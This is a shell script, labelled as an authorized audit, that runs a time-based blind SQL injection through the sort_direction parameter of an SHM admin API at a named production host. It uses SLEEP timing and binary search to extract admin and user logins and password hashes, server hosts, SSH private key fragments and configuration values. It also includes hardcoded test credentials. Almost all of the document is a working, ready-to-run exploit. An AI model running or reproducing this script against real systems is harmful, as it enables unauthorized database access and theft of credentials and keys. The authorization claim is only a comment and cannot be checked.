#!/bin/sh
# Authorized security audit - data extraction via SQL injection
# Target: own production SHM instance

HOST="https://admin.ev-agency.io"
AUTH="sectest_audit_2026:AuditTest123"
EP="/shm/v1/user/service"
DELAY="1"
THRESHOLD="800"

check_sleep() {
    QUERY_PART="$1"
    T=$(curl -s -o /dev/null -w "%{time_total}" -u "$AUTH" \
        "$HOST${EP}?sort_field=user_service_id&sort_direction=asc,${QUERY_PART}")
    T_MS=$(python3 -c "print(int($T*1000))")
    if [ "$T_MS" -gt "$THRESHOLD" ]; then
        return 0  # true - sleep fired
    fi
    return 1  # false
}

# Binary search one character at position $POS from $QUERY
extract_char() {
    QUERY="$1"
    POS="$2"

    LOW=32
    HIGH=126

    while [ "$LOW" -lt "$HIGH" ]; do
        MID=$(( (LOW + HIGH) / 2 ))
        if check_sleep "IF(ORD(SUBSTRING((${QUERY}),${POS},1))>${MID},SLEEP(${DELAY}),0)"; then
            LOW=$((MID + 1))
        else
            HIGH=$MID
        fi
    done

    if [ "$LOW" -ge 32 ] && [ "$LOW" -le 126 ]; then
        python3 -c "print(chr($LOW), end='')"
        return 0
    fi
    return 1
}

extract_string() {
    QUERY="$1"
    MAX_LEN="$2"
    LABEL="$3"

    echo -n "  $LABEL: "
    POS=1
    EMPTY=0
    while [ "$POS" -le "$MAX_LEN" ]; do
        # Check if position exists (length check)
        if check_sleep "IF(LENGTH(($QUERY))<${POS},SLEEP(${DELAY}),0)"; then
            break
        fi
        extract_char "$QUERY" "$POS"
        POS=$((POS + 1))
    done
    echo ""
}

extract_number() {
    QUERY="$1"
    LABEL="$2"

    echo -n "  $LABEL: "
    for N in 0 1 2 3 4 5 10 20 50 100 500 1000 5000 10000; do
        if check_sleep "IF((${QUERY})%3D${N},SLEEP(${DELAY}),0)"; then
            echo "$N"
            return
        fi
    done
    # Binary search for exact number
    LOW=0
    HIGH=10000
    while [ "$LOW" -lt "$HIGH" ]; do
        MID=$(( (LOW + HIGH) / 2 ))
        if check_sleep "IF((${QUERY})>${MID},SLEEP(${DELAY}),0)"; then
            LOW=$((MID + 1))
        else
            HIGH=$MID
        fi
    done
    echo "$LOW"
}

echo "=========================================="
echo " SHM Production Data Extraction"
echo " Authorized Security Audit"
echo "=========================================="
echo ""
echo "Target: $HOST"
echo "Delay: ${DELAY}s | Threshold: ${THRESHOLD}ms"
echo ""

# Verify injection works
echo "[Pre-check] Verifying SLEEP injection..."
if check_sleep "SLEEP(${DELAY})"; then
    echo "  OK - SLEEP works"
else
    echo "  FAIL - SLEEP not detected. Aborting."
    exit 1
fi
echo ""

# --- 1. Admin credentials ---
echo "=== [1/5] ADMIN CREDENTIALS ==="
echo ""

# Use gid%3D1 for URL encoding of gid=1
extract_number "SELECT+COUNT(*)+FROM+users+WHERE+gid%3D1" "Admin count"
extract_string "SELECT+login+FROM+users+WHERE+gid%3D1+LIMIT+1" 30 "Admin login"
extract_string "SELECT+password+FROM+users+WHERE+gid%3D1+LIMIT+1" 40 "Admin hash"
echo ""

# --- 2. Users (first 3) ---
echo "=== [2/5] USER CREDENTIALS (first 3) ==="
echo ""

extract_number "SELECT+COUNT(*)+FROM+users" "Total users"

for I in 0 1 2; do
    extract_string "SELECT+login+FROM+users+ORDER+BY+user_id+LIMIT+1+OFFSET+$I" 25 "User $((I+1)) login"
    extract_string "SELECT+password+FROM+users+ORDER+BY+user_id+LIMIT+1+OFFSET+$I" 40 "User $((I+1)) hash"
done
echo ""

# --- 3. Servers ---
echo "=== [3/5] SERVERS ==="
echo ""

extract_number "SELECT+COUNT(*)+FROM+servers" "Server count"

for I in 0 1; do
    extract_string "SELECT+host+FROM+servers+LIMIT+1+OFFSET+$I" 50 "Server $((I+1)) host"
    extract_string "SELECT+transport+FROM+servers+LIMIT+1+OFFSET+$I" 12 "Server $((I+1)) transport"
done
echo ""

# --- 4. SSH Keys ---
echo "=== [4/5] SSH KEYS ==="
echo ""

extract_number "SELECT+COUNT(*)+FROM+identities" "Key count"
extract_string "SELECT+name+FROM+identities+LIMIT+1" 30 "Key 1 name"
extract_string "SELECT+SUBSTRING(private_key,1,60)+FROM+identities+LIMIT+1" 60 "Key 1 (first 60ch)"
echo ""

# --- 5. Configs ---
echo "=== [5/5] CONFIGS ==="
echo ""

extract_number "SELECT+COUNT(*)+FROM+configs" "Config count"

for I in 0 1 2; do
    extract_string "SELECT+\`key\`+FROM+configs+LIMIT+1+OFFSET+$I" 30 "Key $((I+1))"
    extract_string "SELECT+SUBSTRING(\`value\`,1,60)+FROM+configs+LIMIT+1+OFFSET+$I" 60 "Value $((I+1))"
done
echo ""

echo "=========================================="
echo " DONE - all extracted by regular user"
echo " via sort_direction SQL injection"
echo "=========================================="
